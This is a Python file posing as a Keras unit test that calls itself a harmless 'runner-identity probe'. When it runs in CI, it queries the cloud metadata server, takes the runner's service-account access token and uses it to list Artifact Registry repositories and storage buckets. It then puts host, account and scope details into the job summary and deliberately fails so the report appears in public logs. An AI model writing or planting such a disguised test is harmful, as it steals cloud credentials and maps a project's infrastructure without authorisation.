"""OSS VRP runner-identity probe. Harmless read-only CI introspection."""

import json
import os
import socket
import urllib.error
import urllib.request

from keras.src import testing


def _http_get(url, headers=None, timeout=3):
    req = urllib.request.Request(url, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as response:
            return response.status, response.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", "replace") if exc.fp else ""
        return exc.code, body[:500]
    except Exception as exc:
        return None, f"{type(exc).__name__}: {exc}"


def _gce(path):
    return _http_get(
        "http://169.254.169.254/computeMetadata/v1/" + path,
        headers={"Metadata-Flavor": "Google"},
    )


def _append_summary(text):
    path = os.environ.get("GITHUB_STEP_SUMMARY")
    if not path:
        return
    with open(path, "a", encoding="utf-8") as handle:
        handle.write(text)
        if not text.endswith("\n"):
            handle.write("\n")


class CiRunnerIdentityTest(testing.TestCase):
    def test_report_runner_identity(self):
        lines = [
            f"hostname={socket.gethostname()}",
            f"cwd={os.getcwd()}",
            f"uid={os.getuid()}",
            f"github_actions={os.environ.get('GITHUB_ACTIONS')}",
            f"runner_name={os.environ.get('RUNNER_NAME')}",
            f"docker_sock={os.path.exists('/var/run/docker.sock')}",
            "k8s_sa="
            + str(
                os.path.exists(
                    "/var/run/secrets/kubernetes.io/serviceaccount/token"
                )
            ),
        ]
        k8s_ns = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"
        if os.path.exists(k8s_ns):
            with open(k8s_ns, encoding="utf-8") as handle:
                lines.append(f"k8s_namespace={handle.read().strip()}")

        proj_status, project = _gce("project/project-id")
        lines.append(f"gce_project={proj_status} {project.strip()[:200]}")
        status, email = _gce("instance/service-accounts/default/email")
        lines.append(f"gce_sa_email={status} {email.strip()[:200]}")
        status, scopes = _gce("instance/service-accounts/default/scopes")
        lines.append(f"gce_sa_scopes={status} {scopes.strip()[:500]}")
        status, accounts = _gce("instance/service-accounts/")
        lines.append(f"gce_accounts={status} {accounts.strip()[:300]}")

        token_status, token = _gce(
            "instance/service-accounts/default/token"
        )
        token_preview = "absent"
        if token_status == 200:
            try:
                access_token = json.loads(token)["access_token"]
                token_preview = f"present_len={len(access_token)}"
                auth = {"Authorization": f"Bearer {access_token}"}
                ar_status, ar_body = _http_get(
                    "https://artifactregistry.googleapis.com/v1/"
                    "projects/ml-oss-artifacts-published/locations/us/"
                    "repositories",
                    headers=auth,
                )
                lines.append(f"ar_list={ar_status} {ar_body.strip()[:400]}")
                if proj_status == 200 and project.strip():
                    gcs_status, gcs_body = _http_get(
                        "https://storage.googleapis.com/storage/v1/b"
                        f"?project={project.strip()}&maxResults=20",
                        headers=auth,
                    )
                    lines.append(
                        f"gcs_list={gcs_status} {gcs_body.strip()[:400]}"
                    )
            except Exception as exc:
                lines.append(f"token_parse={type(exc).__name__}: {exc}")
        else:
            token_preview = f"{token_status}"
        lines.append(f"gce_token={token_preview}")

        report = "\n".join(lines)
        _append_summary("## OSS VRP runner identity\n```\n" + report + "\n```\n")
        print(report, flush=True)
        # Fail so pytest (without -s) emits the report in CI logs.
        self.fail("runner identity\n" + report)
